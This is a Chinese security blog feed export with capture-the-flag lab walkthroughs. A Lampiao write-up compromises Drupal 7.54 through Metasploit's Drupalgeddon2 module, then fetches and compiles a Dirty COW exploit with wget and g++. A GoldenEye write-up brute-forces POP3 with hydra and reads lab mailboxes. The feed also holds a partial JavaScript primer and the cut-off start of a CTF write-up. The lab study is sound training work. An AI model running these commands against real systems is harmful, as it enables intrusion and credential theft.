class="line">http://192.168.159.131:1898/?q=node/2</span><br></pre></td></tr></table></figure><p>里面有一个<br>audio.m4a<br>qrc.png</p><p>audio.m4a下载下来播放以后说是</p><p>user:tiago</p><p>图片是一个二维码，扫了没什么用</p><p>看看扫面出来的其他的</p><p>发现一个</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/CHANGELOG.txt</span><br></pre></td></tr></table></figure><p>进去以后上来就是Drupal 7.54, 2017-02-01</p><p>OK版本号知道了</p><p>感觉可以用一首crew来爆密码，毕竟刚才已经给了账号，但我直接搜的Drupal 7.54的漏洞，看到一个2018的RCE</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>提权用的是脏牛，简单介绍一下脏牛吧</p><h3 id="脏牛提权"><a href="#脏牛提权" class="headerlink" title="脏牛提权"></a>脏牛提权</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">脏牛漏洞的漏洞点位于 Linux 内核中的 &quot;mm/madvise.c&quot; 文件中。攻击者可以通过对某个可写的映射文件的 &quot;madvise()&quot; 系统调用进行操纵，从而触发内核中的一个缺陷。攻击者通过修改页表项和文件系统缓存，将映射文件的权限更改为 &quot;可写&quot;，并且将该文件映射到内存中。这样，攻击者可以在内存中修改文件的内容，并将多个进程的 Copy-On-Write 页面指向被修改的内存页，绕过 &quot;Copy-On-Write&quot; 的保护机制。</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>利用过程：</p><ul><li>攻击者首先找到一个可写的映射文件，通常是一个拥有 “suid” 或 “sgid” 权限的可执行文件。</li><li>通过执行一段特制的代码，利用 “madvise()” 系统调用漏洞修改文件的权限。</li><li>攻击者通过将修改后的文件映射到内存并修改其中的特定字段，来爆发该漏洞。</li><li>当其他进程尝试对该映射文件执行写操作时，会将进程的 “Copy-On-Write” 页面指向被修改的内存页。</li><li>最终，攻击者就能够在内核中执行具有 root 权限的恶意代码。</li></ul><h3 id="回归正题"><a href="#回归正题" class="headerlink" title="回归正题"></a>回归正题</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; search drupal</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #   Name                                                              Disclosure Date  Rank       Check  Description</span><br><span class="line">   -   ----                                                              ---------------  ----       -----  -----------</span><br><span class="line">   0   exploit/unix/webapp/drupal_coder_exec                             2016-07-13       excellent  Yes    Drupal CODER Module Remote Command Execution</span><br><span class="line">   1   exploit/unix/webapp/drupal_drupalgeddon2                          2018-03-28       excellent  Yes    Drupal Drupalgeddon 2 Forms API Property Injection</span><br><span class="line">   2     \_ target: Automatic (PHP In-Memory)                            .                .          .      .</span><br><span class="line">   3     \_ target: Automatic (PHP Dropper)                              .                .          .      .</span><br><span class="line">   4     \_ target: Automatic (Unix In-Memory)                           .                .          .      .</span><br><span class="line">   5     \_ target: Automatic (Linux Dropper)                            .                .          .      .</span><br><span class="line">   6     \_ target: Drupal 7.x (PHP In-Memory)                           .                .          .      .</span><br><span class="line">   7     \_ target: Drupal 7.x (PHP Dropper)                             .                .          .      .</span><br><span class="line">   8     \_ target: Drupal 7.x (Unix In-Memory)                          .                .          .      .</span><br><span class="line">   9     \_ target: Drupal 7.x (Linux Dropper)                           .                .          .      .</span><br><span class="line">   10    \_ target: Drupal 8.x (PHP In-Memory)                           .                .          .      .</span><br><span class="line">   11    \_ target: Drupal 8.x (PHP Dropper)                             .                .          .      .</span><br><span class="line">   12    \_ target: Drupal 8.x (Unix In-Memory)                          .                .          .      .</span><br><span class="line">   13    \_ target: Drupal 8.x (Linux Dropper)                           .                .          .      .</span><br><span class="line">   14    \_ AKA: SA-CORE-2018-002                                        .                .          .      .</span><br><span class="line">   15    \_ AKA: Drupalgeddon 2                                          .                .          .      .</span><br><span class="line">   16  exploit/multi/http/drupal_drupageddon                             2014-10-15       excellent  No     Drupal HTTP Parameter Key/Value SQL Injection</span><br><span class="line">   17    \_ target: Drupal 7.0 - 7.31 (form-cache PHP injection method)  .                .          .      .</span><br><span class="line">   18    \_ target: Drupal 7.0 - 7.31 (user-post PHP injection method)   .                .          .      .</span><br><span class="line">   19  auxiliary/gather/drupal_openid_xxe                                2012-10-17       normal     Yes    Drupal OpenID External Entity Injection</span><br><span class="line">   20  exploit/unix/webapp/drupal_restws_exec                            2016-07-13       excellent  Yes    Drupal RESTWS Module Remote PHP Code Execution</span><br><span class="line">   21  exploit/unix/webapp/drupal_restws_unserialize                     2019-02-20       normal     Yes    Drupal RESTful Web Services unserialize() RCE</span><br><span class="line">   22    \_ target: PHP In-Memory                                        .                .          .      .</span><br><span class="line">   23    \_ target: Unix In-Memory                                       .                .          .      .</span><br><span class="line">   24  auxiliary/scanner/http/drupal_views_user_enum                     2010-07-02       normal     Yes    Drupal Views Module Users Enumeration</span><br><span class="line">   25  exploit/unix/webapp/php_xmlrpc_eval                               2005-06-29       excellent  Yes    PHP XML-RPC Arbitrary Code Execution</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interact with a module by name or index. For example info 25, use 25 or use exploit/unix/webapp/php_xmlrpc_eval</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://pic.imgdb.cn/item/66798e13d9c307b7e9c79dad.png" alt=""><br><img src="https://pic.imgdb.cn/item/66798e2fd9c307b7e9c7f853.png" alt=""><br>use 1一发入魂（所以为什么有的师傅说1不行<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">www-data权限</span><br><span class="line"></span><br><span class="line">uname -a 看一眼系统，linux，用脏牛</span><br></pre></td></tr></table></figure><br>msf搜一下有没有脚本<br><img src="https://pic.imgdb.cn/item/66798e47d9c307b7e9c84427.png" alt=""><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name 40487.cpp</span><br></pre></td></tr></table></figure><br>cp到~，然后开放5555端口，用Py启一个服务器</p><p><img src="https://pic.imgdb.cn/item/66798e55d9c307b7e9c867d5.png" alt=""></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.159.129:5555/40847.cpp</span><br><span class="line"></span><br><span class="line">g++ -Wall -pedantic -O2 -std=c++11 -pthread -o 40847 40847.cpp -lutil</span><br></pre></td></tr></table></figure><p>直接G++提权</p><ul><li>-Wall 一般使用该选项，允许发出GCC能够提供的所有有用的警告</li><li>-pedantic 允许发出ANSI/ISO C标准所列出的所有警告</li><li>-O2编译器的优化选项的4个级别，-O0表示没有优化,-O1为缺省值，-O3优化级别最高</li><li>-std=c++11就是用按C++2011标准来编译的</li><li>-pthread 在Linux中要用到多线程时，需要链接pthread库</li><li>-o 40847 gcc生成的目标文件,名字为40847</li></ul><p>看了眼过程是没问题的，但是结果好慢，我直接找了个wp截图的（hambugerhan师傅的，<a href="https://www.freebuf.com/articles/web/265340.html">链接</a>）<br><img src="https://pic.imgdb.cn/item/66798dded9c307b7e9c6af7f.png" alt=""><br>直接出了PASSWORD，SSH登录就是ROOT，直接find flag.txt就可以了</p>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> lampao </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>goldeneye靶场</title>
      <link href="/2025/01/08/2024%E5%B9%B46%E6%9C%8821%E6%97%A5-GoldenEye/"/>
      <url>/2025/01/08/2024%E5%B9%B46%E6%9C%8821%E6%97%A5-GoldenEye/</url>
      
        <content type="html"><![CDATA[<h1 id="goldeneye靶场"><a href="#goldeneye靶场" class="headerlink" title="goldeneye靶场"></a>goldeneye靶场</h1><h2 id="基础操作"><a href="#基础操作" class="headerlink" title="基础操作"></a>基础操作</h2><p>下载，解压，vmware扫描，打开，这些就不修要我过多叙述</p><p>记得将其设置程net网关</p><p>打开攻击机(kali)<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig #查看自己的ip</span><br></pre></td></tr></table></figure></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.241.0/24   # 扫描当前网段下存活主机</span><br><span class="line">nmap 192.168.241.132 扫描该主机</span><br></pre></td></tr></table></figure><p>nmap用法</p><p><a href="https://blog.csdn.net/smli_ng/article/details/105964486">nmap</a></p><p><a href="https://www.cnblogs.com/nmap/p/6232207.html">nmap命令——-基础用法 </a></p><p><img src="https://pic.imgdb.cn/item/66703c38d9c307b7e9a7cc5b.png" alt=""></p><p>扫描出来发现开放了25以及80端口，包访问80的</p><p><img src="https://pic.imgdb.cn/item/66703cbad9c307b7e9a90cf8.png" alt=""></p><p>按照他的试试访问/sev-home/,有一个登录框提示，所以我们要找到账号密码，回到<a href="http://192.168.241.132/">http://192.168.241.132/</a></p><p>查看源码发现里面有个js文件，进去看一眼发现一段备注，里面掺杂一个html编码</p><p><img src="https://pic.imgdb.cn/item/667042c9d9c307b7e9b5fa3f.png" alt=""></p><p>包登录的老弟，账密是boris/InvincibleHack3r</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hydra -L dayu.txt -P /usr/share/wordlists/fasttrack.txt 192.168.241.132 -s 55007 pop3</span><br><span class="line">这里面-L -P是读取文本信息，-l是直接输入账号就好，最后的pop3，如果要爆破数据库就是mysql，爆啥写啥</span><br></pre></td></tr></table></figure><p><img src="https://pic.imgdb.cn/item/66705190d9c307b7e9d3fefc.png" alt=""></p><p>应该是能爆破出两个的（他说2-5分钟我都等了快十分钟了还是只爆破出了batalya/bird）</p><p>（看了视频才知道还是有另一个boris/sectet1!)</p><p><img src="https://pic.imgdb.cn/item/667051ded9c307b7e9d47ef5.png" alt=""></p><p>登录boris<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ nc 192.168.241.132 55007</span><br><span class="line">+OK GoldenEye POP3 Electronic-Mail System</span><br><span class="line">user boris</span><br><span class="line">+OK</span><br><span class="line">pass sectet1!    </span><br><span class="line">+OK Logged in.</span><br></pre></td></tr></table></figure></p><p>查看里面的东西<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">list</span><br><span class="line">+OK 3 messages:</span><br><span class="line">1 544</span><br><span class="line">2 373</span><br><span class="line">3 921</span><br><span class="line">.</span><br><span class="line">retr 1   #查看1文件</span><br><span class="line">+OK 544 octets</span><br><span class="line">Return-Path: &lt;root@127.0.0.1.goldeneye&gt;</span><br><span class="line">X-Original-To: boris</span><br><span class="line">Delivered-To: boris@ubuntu</span><br><span class="line">Received: from ok (localhost [127.0.0.1])</span><br><span class="line">        by ubuntu (Postfix) with SMTP id D9E47454B1</span><br><span class="line">        for &lt;boris&gt;; Tue, 2 Apr 1990 19:22:14 -0700 (PDT)</span><br><span class="line">Message-Id: &lt;20180425022326.D9E47454B1@ubuntu&gt;</span><br><span class="line">Date: Tue, 2 Apr 1990 19:22:14 -0700 (PDT)</span><br><span class="line">From: root@127.0.0.1.goldeneye</span><br><span class="line"></span><br><span class="line">Boris, this is admin. You can electronically communicate to co-workers and students here. I&#x27;m not going to scan emails for security risks because I trust you and the other admins here.</span><br><span class="line">.</span><br><span class="line">一个管理员发给boris的看着没有什么用处</span><br><span class="line"></span><br><span class="line">retr 2#查看2文件</span><br><span class="line">+OK 373 octets</span><br><span class="line">Return-Path: &lt;natalya@ubuntu&gt;</span><br><span class="line">X-Original-To: boris</span><br><span class="line">Delivered-To: boris@ubuntu</span><br><span class="line">Received: from ok (localhost [127.0.0.1])</span><br><span class="line">        by ubuntu (Postfix) with ESMTP id C3F2B454B1</span><br><span class="line">        for &lt;boris&gt;; Tue, 21 Apr 1995 19:42:35 -0700 (PDT)</span><br><span class="line">Message-Id: &lt;20180425024249.C3F2B454B1@ubuntu&gt;</span><br><span class="line">Date: Tue, 21 Apr 1995 19:42:35 -0700 (PDT)</span><br><span class="line">From: natalya@ubuntu</span><br><span class="line"></span><br><span class="line">Boris, I can break your codes!</span><br><span class="line">.</span><br><span class="line"></span><br><span class="line">natalya发给boris的说我可以渗透进你的系统，正好和之前的natalya数可以渗透进你的系统一样</span><br><span class="line">正好爆出natalya的尼玛我们一会试试</span><br><span class="line"></span><br><span class="line">retr 3  #查看3文件</span><br><span class="line">+OK 921 octets</span><br><span class="line">Return-Path: &lt;alec@janus.boss&gt;</span><br><span class="line">X-Original-To: boris</span><br><span class="line">Delivered-To: boris@ubuntu</span><br><span class="line">Received: from janus (localhost [127.0.0.1])</span><br><span class="line">        by ubuntu (Postfix) with ESMTP id 4B9F4454B1</span><br><span class="line">        for &lt;boris&gt;; Wed, 22 Apr 1995 19:51:48 -0700 (PDT)</span><br><span class="line">Message-Id: &lt;20180425025235.4B9F4454B1@ubuntu&gt;</span><br><span class="line">Date: Wed, 22 Apr 1995 19:51:48 -0700 (PDT)</span><br><span class="line">From: alec@janus.boss</span><br><span class="line"></span><br><span class="line">Boris,</span><br><span class="line"></span><br><span class="line">Your cooperation with our syndicate will pay off big. Attached are the final access codes for GoldenEye. Place them in a hidden file within the root directory of this server then remove from this email. There can only be one set of these acces codes, and we need to secure them for the final execution. If they are retrieved and captured our plan will crash and burn!</span><br><span class="line"></span><br><span class="line">Once Xenia gets access to the training site and becomes familiar with the GoldenEye Terminal codes we will push to our final stages....</span><br><span class="line"></span><br><span class="line">PS - Keep security tight or we will be compromised.</span><br><span class="line"></span><br><span class="line">安全性问题，看这么没什么东西</span><br></pre></td></tr></table></figure></p><p>登录natalya<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ nc 192.168.241.132 55007</span><br><span class="line">+OK GoldenEye POP3 Electronic-Mail System</span><br><span class="line">user natalya</span><br><span class="line">+OK</span><br><span class="line">pass bird</span><br><span class="line">+OK Logged in.</span><br><span class="line">list</span><br><span class="line">+OK 2 messages:</span><br><span class="line">1 631</span><br><span class="line">2 1048</span><br><span class="line">.</span><br><span class="line">retr 1</span><br><span class="line">+OK 631 octets</span><br><span class="line">Return-Path: &lt;root@ubuntu&gt;</span><br><span class="line">X-Original-To: natalya</span><br><span class="line">Delivered-To: natalya@ubuntu</span><br><span class="line">Received: from ok (localhost [127.0.0.1])</span><br><span class="line">        by ubuntu (Postfix) with ESMTP id D5EDA454B1</span><br><span class="line">        for &lt;natalya&gt;; Tue, 10 Apr 1995 19:45:33 -0700 (PDT)</span><br><span class="line">Message-Id: &lt;20180425024542.D5EDA454B1@ubuntu&gt;</span><br><span class="line">Date: Tue, 10 Apr 1995 19:45:33 -0700 (PDT)</span><br><span class="line">From: root@ubuntu</span><br><span class="line"></span><br><span class="line">Natalya, please you need to stop breaking boris&#x27; codes. Also, you are GNO supervisor for training. I will email you once a student is designated to you.</span><br><span class="line"></span><br><span class="line">Also, be cautious of possible network breaches. We have intel that GoldenEye is being sought after by a crime syndicate named Janus.</span><br><span class="line">.</span><br><span class="line">retr  2</span><br><span class="line">+OK 1048 octets</span><br><span class="line">Return-Path: &lt;root@ubuntu&gt;</span><br><span class="line">X-Original-To: natalya</span><br><span class="line">Delivered-To: natalya@ubuntu</span><br><span class="line">Received: from root (localhost [127.0.0.1])</span><br><span class="line">        by ubuntu (Postfix) with SMTP id 17C96454B1</span><br><span class="line">        for &lt;natalya&gt;; Tue, 29 Apr 1995 20:19:42 -0700 (PDT)</span><br><span class="line">Message-Id: &lt;20180425031956.17C96454B1@ubuntu&gt;</span><br><span class="line">Date: Tue, 29 Apr 1995 20:19:42 -0700 (PDT)</span><br><span class="line">From: root@ubuntu</span><br><span class="line"></span><br><span class="line">Ok Natalyn I have a new student for you. As this is a new system please let me or boris know if you see any config issues, especially is it&#x27;s related to security...even if it&#x27;s not, just enter it in under the guise of &quot;security&quot;...it&#x27;ll get the change order escalated without much hassle :)</span><br><span class="line"></span><br><span class="line">Ok, user creds are:</span><br><span class="line"></span><br><span class="line">username: xenia</span><br><span class="line">password: RCP90rulez!</span><br><span class="line"></span><br><span class="line">Boris verified her as a valid contractor so just create the account ok?</span><br><span class="line"></span><br><span class="line">And if you didn&#x27;t have the URL on outr internal Domain: severnaya-station.com/gnocertdir</span><br><span class="line">**Make sure to edit your host file since you usually work remote off-network....</span><br><span class="line"></span><br><span class="line">Since you&#x27;re a Linux user just point this servers IP to severnaya-station.com in /etc/hosts.</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>第一封看着没什么东西，但是第二封信就很有搞头了</p><p>给了账号密码</p><p>给了个内部域的登录，并且提示我们要改hosts</p><p>gedit /etc/hosts</p><p>改了以后登录</p><p><a href="http://severnaya-station.com/gnocertdir/">http://severnaya-station.com/gnocertdir/</a></p><p>进入后台<br><img src="https://pic.imgdb.cn/item/667052dad9c307b7e9d7086c.png" alt=""></p><p>使用natalya的账号密码登录</p><p>发现一个邮件<br><img src="https://pic.imgdb.cn/item/6670552ed9c307b7e9dc2e08.png" alt=""><br>查看<br><img src="https://pic.imgdb.cn/item/66705513d9c307b7e9dbf740.png" alt=""><br>发现一个新的名字<br><code>doak</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# hydra -l doak -P /usr/share/wordlists/fasttrack.txt 192.168.241.132 -s 55007 pop3</span><br></pre></td></tr></table></figure><p>后面我做完了其实，但是第二天因为一些奇奇怪怪的问题电脑爆了重装了系统，前天写完忘了传丢在桌面就无了</p><p><del>（fleet能不能出个记录啊）</del></p><p>后面就是在doak登录，看邮件，邮件里面给了个账号密码，之后登录网站后台，印象中是有一个图片，能用exiftool<br>解析出base64加密的网站后台密码，登录，看到版本号，google搜moodle漏洞，</p><p>后面我就不再打一遍了<del>（问就是懒）</del><br>[goldeneye]（<a href="https://blog.csdn.net/weixin_39368364/article/details/119462349）">https://blog.csdn.net/weixin_39368364/article/details/119462349）</a><br>师傅写的满详细的，后面不会照着看就行，印象中最后是永恒之蓝的洞？</p>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> Goldeneye </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>原型链污染</title>
      <link href="/2025/01/08/2024%E5%B9%B46%E6%9C%8820%E6%97%A5-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
      <url>/2025/01/08/2024%E5%B9%B46%E6%9C%8820%E6%97%A5-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</url>
      
        <content type="html"><![CDATA[<h2 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h2><h3 id="js"><a href="#js" class="headerlink" title="js"></a>js</h3><p>javascript是一种完全的面向对象的有说<br>HTML中给的js必须包含在<code>&lt;script&gt;</code>与<code>&lt;/script&gt;</code>之间<br>js代码脚本可以被放置在html中的<code>&lt;head&gt;</code>和<code>&lt;body&gt;</code>中<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    alert(&quot;my first script&quot;);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">document.write(&quot;&lt;h1&gt;这是一个标题&lt;/h1&gt;&quot;);</span><br><span class="line">document.write(&quot;&lt;p&gt;这是一个段落&lt;/p&gt;&quot;);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">function myFunction()</span><br><span class="line">&#123;</span><br><span class="line">document.getElementById(&quot;demo&quot;).innerHTML=&quot;我的第一个 JavaScript 函数&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;我的 Web 页面&lt;/h1&gt;</span><br><span class="line">&lt;p id=&quot;demo&quot;&gt;一个段落&lt;/p&gt;</span><br><span class="line">&lt;button type=&quot;button&quot; onclick=&quot;myFunction()&quot;&gt;尝试一下&lt;/button&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>也可以把js文件存在外部，保存为.js，但是调用的时候就是<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt; </span><br><span class="line">&lt;meta charset=&quot;utf-8&quot;&gt; </span><br><span class="line">&lt;title&gt;菜鸟教程(runoob.com)&lt;/title&gt; </span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;h1&gt;我的 Web 页面&lt;/h1&gt;</span><br><span class="line">&lt;p id=&quot;demo&quot;&gt;一个段落。&lt;/p&gt;</span><br><span class="line">&lt;button type=&quot;button&quot; onclick=&quot;myFunction()&quot;&gt;点击这里&lt;/button&gt;</span><br><span class="line">&lt;p&gt;&lt;b&gt;注释：&lt;/b&gt;myFunction 保存在名为 &quot;myscript.js&quot; 的外部文件中。&lt;/p&gt;</span><br><span class="line">&lt;script src=&quot;myscript.js&quot;&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function myFunction()</span><br><span class="line">&#123;</span><br><span class="line">    document.getElementById(&quot;demo&quot;).innerHTML=&quot;我的第一个 JavaScript 函数&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>getelementById() 方法可返回对拥有指定 ID 的第一个对象的引用。</code></p><p>js中可以通过<code>&quot;\&quot;</code>进行换行</p><p>但是你不能<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">document.write \ </span><br><span class="line">(&quot;你好世界!&quot;);</span><br></pre></td></tr></table></figure></p><p>html中<code>&lt;p&gt;</code>标签定义段落。</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> 原型链污染 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CISCN2024_canic</title>
      <link href="/2025/01/08/2024%E5%B9%B46%E6%9C%8820%E6%97%A5-csicn2024-canic-wp/"/>
      <url>/2025/01/08/2024%E5%B9%B46%E6%9C%8820%E6%97%A5-csicn2024-canic-wp/</url>
      
        <content type="html"><![CDATA[<p>原型链污染的题</p><p>敏感目录提示了是<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/src</span><br><span class="line">/admin</span><br></pre></td></tr></table></figure><br>在src里面可以看到源码<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span 